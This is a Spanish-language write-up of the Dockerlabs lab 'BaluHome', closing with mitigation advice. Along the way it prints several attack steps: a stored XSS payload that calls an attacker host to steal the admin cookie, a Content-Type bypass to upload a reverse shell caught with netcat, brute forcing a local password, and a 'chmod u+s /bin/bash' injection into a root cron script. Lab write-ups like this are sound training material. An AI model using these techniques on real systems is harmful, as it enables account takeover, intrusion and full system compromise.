# BaluHome - Writeup de Dockerlabs (Dificultad: Medio)

## 1. Fase de Reconocimiento y Escaneo (Enumeración)
El laboratorio comienza con un escaneo de puertos y servicios utilizando la herramienta `nmap`, identificando únicamente el puerto `3000` activo con un servicio HTTP:

![alt text](Img/1-nmap.png)

Al acceder al servicio web, se identifica una plataforma clon de YouTube. Se observan algunas secciones funcionales, como un sistema de registro de perfiles y una sección de visualización de videos (la cual no se encuentra implementada por completo).

![alt text](Img/2-http.png)
![alt text](Img/3-httpVideos.png)

## 2. Acceso Inicial (Explotación de Stored XSS y Session Hijacking)
Para interactuar con las funcionalidades de la plataforma, se procede a registrar un nuevo usuario con las credenciales `test:test`:

![alt text](Img/4-register.png)

Tras iniciar sesión, se identifica una sección de mensajería interna que revela posibles nombres de usuario válidos dentro del sistema, entre los cuales destaca el usuario `admin`:

![alt text](Img/5-mensajes.png)

Aunque la plataforma cuenta con una función para subir videos, tras realizar pruebas iniciales no se detectó ningún comportamiento vulnerable de manera directa en dicha subida:

![alt text](<Img/6-subir video.png>)

Sin embargo, al subir un video, el sistema permite agregar subtítulos. Se comprueba que este campo de entrada es vulnerable a una inyección de Scripts de Sitios Cruzados de tipo Almacenado (Stored XSS), lo cual se verifica inyectando una carga útil simple como `alert(0)`:

![alt text](Img/7-subitutlos.png)
![alt text](Img/8-XSS.png)

Una vez confirmada la vulnerabilidad Stored XSS, se diseña un vector de ataque para comprometer la cuenta de administración. El objetivo es enviar un enlace del video que contiene la inyección XSS al usuario `admin` a través de la mensajería interna para secuestrar su cookie de sesión.

La carga útil (payload) de XSS utilizada consiste en realizar una petición externa al servidor del atacante cargando un script para extraer la cookie de sesión:

```html
<script src="http://[IP_ADDRESS]/?c="></script>
```

*(Nota: Este script realiza una petición HTTP GET al servidor controlado por el atacante, enviando o solicitando recursos externos; en escenarios prácticos de robo de cookies mediante XSS, se suele concatenar la propiedad `document.cookie`).*

Antes de enviar el enlace al administrador, se inicia un servidor HTTP temporal en la máquina atacante utilizando Python en el puerto 80:
```bash
python3 -m http.server 80
```

Tras enviar el mensaje con el enlace del video al administrador, el navegador de la víctima carga automáticamente el script malicioso al procesar los subtítulos, enviando la cookie de sesión de vuelta a nuestra consola del servidor HTTP de Python:

![alt text](Img/9-sendLink.png)
![alt text](Img/10-pythonServer.png)

La cookie de sesión capturada se encuentra codificada en Base64. Para decodificarla y obtener su valor real, se ejecuta el siguiente comando en la máquina atacante:
```bash
echo "<cookie_en_base64>" | base64 -d
```

Una vez decodificada, se reemplaza la cookie de sesión en las herramientas de desarrollador del navegador web, logrando suplantar al administrador y acceder exitosamente a su perfil:

![alt text](Img/11-adminCookie.png)

## 3. Subida de Archivos Arbitrarios y Ejecución Remota de Código (RCE)
El perfil del administrador dispone de una funcionalidad exclusiva para gestionar miniaturas de videos. Aunque la aplicación cuenta con un filtro en la subida de archivos que teóricamente solo permite imágenes, esta restricción se puede evadir interceptando la petición HTTP con Burp Suite y modificando el encabezado `Content-Type` del archivo a `image/jpg`.

Se procede a subir un archivo de scripting (JavaScript) diseñado para entablar una conexión de shell reversa al puerto `4444` de la máquina atacante, evadiendo la validación de extensión/tipo de archivo en la subida:

![alt text](Img/12-Miniaturas.png)
![alt text](Img/13-Burp.png)
![alt text](Img/14-ChangeType.png)
![alt text](Img/13-miniaturaSubida.png)

Para activar el script y obtener la consola interactiva en nuestra máquina (la cual debe estar en escucha mediante Netcat en el puerto 4444 con `nc -lvnp 4444`), se ejecuta el video donde se cargó la miniatura modificada, obteniendo de esta forma la shell reversa como el usuario web `www-data`:

![alt text](Img/15-shellWWW.png)

## 4. Movimiento Lateral (Fuerza Bruta)
Tras obtener la shell reversa y realizar el tratamiento de la TTY para trabajar en una consola interactiva estable, se realiza una enumeración local del sistema. Se identifica la existencia del usuario local `balutin`, quien representa nuestro objetivo para realizar movimiento lateral.

Para obtener las credenciales de acceso de `balutin`, se realiza un ataque de fuerza bruta. Para esto, se transfieren a la máquina comprometida el diccionario de contraseñas `rockyou.txt` y un script de fuerza bruta (`force.sh`) clonado del repositorio público de GitHub <https://github.com/nohh022/bruteForce.git>. La transferencia de archivos se realiza utilizando Netcat:

En el receptor (máquina víctima):
```bash
nc -lvnp [PORT] > archivo
```
En el emisor (máquina atacante):
```bash
nc [IP] [PORT] < archivo
```

![alt text](Img/16-SendFiles.png)

Una vez transferidos los archivos, se le asignan permisos de ejecución al script (`chmod +x force.sh`) y se inicia el ataque:

![alt text](Img/17-force.png)

Transcurrido un tiempo, el script logra descifrar con éxito la contraseña correspondiente al usuario `balutin`:

![alt text](Img/17-forceResult.png)

Con las credenciales obtenidas, se realiza la migración de usuario mediante el comando `su balutin`, accediendo a una shell interactiva bajo este contexto de seguridad:

![alt text](Img/18-shellBalutin.png)

Al comprobar la información y grupos del usuario con el comando `id`, se observa que `balutin` forma parte del grupo `mantenimiento`:

![alt text](Img/19-idBalutin.png)

## 5. Escalada de Privilegios
Al realizar una búsqueda minuciosa de archivos asociados al grupo `mantenimiento`, se localiza un script de respaldo llamado `backup.sh` en el directorio `/opt/balutube-backup/`.

Debido a que el usuario `balutin` (como miembro de `mantenimiento`) posee permisos de escritura sobre este archivo, y sabiendo que dicho script es ejecutado periódicamente por el usuario `root` (probablemente a través de un cronjob), es posible abusar de esta configuración inyectando un comando malicioso para establecer el bit SUID sobre el ejecutable binario `/bin/bash`:

```bash
echo "chmod u+s /bin/bash" >> /opt/balutube-backup/backup.sh
```

Tras la siguiente ejecución automática del script, el binario `/bin/bash` adquiere privilegios SUID de root. Finalmente, ejecutamos bash en modo privilegiado para obtener acceso total e ilimitado (root) en el sistema:

```bash
bash -p
```

![alt text](Img/Root.png)

---

## 6. Recomendaciones de Mitigación

Para asegurar el entorno y remediar las vulnerabilidades explotadas a lo largo de este laboratorio, se proponen las siguientes mitigaciones técnicas:

1. **Mitigación para Stored XSS**:
   Implementar una desinfección y codificación de entradas (input sanitization & output encoding) estricta en todos los campos que acepten texto por parte del usuario, como los subtítulos. Se recomienda codificar los caracteres especiales en entidades HTML (por ejemplo, convertir `<` en `&lt;` y `>` en `&gt;`) y emplear políticas de seguridad de contenido (CSP - Content Security Policy) fuertes que limiten la ejecución de scripts no autorizados u orígenes externos.
2. **Mitigación para Robo de Cookies (Session Hijacking)**:
   Configurar los atributos de seguridad de las cookies de sesión. En particular, la cookie de sesión debe tener habilitado el atributo `HttpOnly` para evitar que sea accesible mediante scripts del lado del cliente (como JavaScript/XSS). Adicionalmente, implementar el atributo `Secure` para forzar su transmisión únicamente a través de canales cifrados HTTPS y `SameSite=Strict` para prevenir ataques CSRF.
3. **Mitigación para Subida de Archivos Arbitrarios (RCE)**:
   Implementar una validación robusta de archivos en el lado del servidor. No depender exclusivamente del encabezado `Content-Type` enviado por el cliente, ya que este puede ser manipulado. Se debe validar la extensión del archivo contra una lista blanca estricta, verificar la firma o "números mágicos" del archivo, cambiar el nombre del archivo de forma aleatoria al guardarlo y, fundamentalmente, almacenar los archivos subidos en un directorio fuera del árbol de ejecución web o configurar el servidor web (como Nginx/Apache) para que no ejecute scripts en los directorios de carga de archivos.
4. **Mitigación para Fuerza Bruta y Contraseñas Débiles**:
   Establecer una política de contraseñas robustas (mínimo de longitud, caracteres especiales, mayúsculas y minúsculas) para todos los usuarios locales como `balutin`. Adicionalmente, implementar límites de intentos de inicio de sesión o un sistema de bloqueo de cuentas temporal, y desplegar herramientas de monitoreo como `Fail2ban` en servicios como SSH/consola local para bloquear de forma automática IPs o intentos de fuerza bruta repetidos.
5. **Mitigación para Escalada de Privilegios por Scripts de Terceros**:
   Aplicar el Principio de Menor Privilegio (PoLP). Los scripts que son ejecutados por `root` no deben ser modificables por usuarios o grupos de bajos privilegios como `mantenimiento` (evitar permisos de escritura como `775` o `777`). La propiedad del archivo `/opt/balutube-backup/backup.sh` debe pertenecer a `root:root` con permisos estrictos de lectura y ejecución únicamente (por ejemplo, `755` o `700`). Si los miembros del grupo mantenimiento necesitan modificar el script, sus acciones deben ser auditadas detalladamente y no deben ejecutarse directamente como root sin controles de integridad previos.
